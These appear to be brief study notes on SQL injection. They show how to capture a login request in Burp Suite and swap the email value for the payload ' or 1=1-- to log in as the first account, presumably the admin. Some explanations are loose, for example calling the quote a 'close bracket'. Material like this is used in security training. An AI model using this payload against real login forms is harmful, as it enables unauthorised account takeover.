SQL Query to get/change Data from Database
SQL Query to login into Accounts

Example:

Login into Site and capture Request in Burp Suite

Example Capture:

`{"email": "xxx@web.de", "password": "123"}`

Change to:

`{"email": "' or 1=1--", "password": "123"}`

- ' = close bracket in SQL
- "or 1" is always true, means the email is valid
- since email is true, we can login as User 0 (should be the admin)
- "-" = comment begin, comments the rest of the statement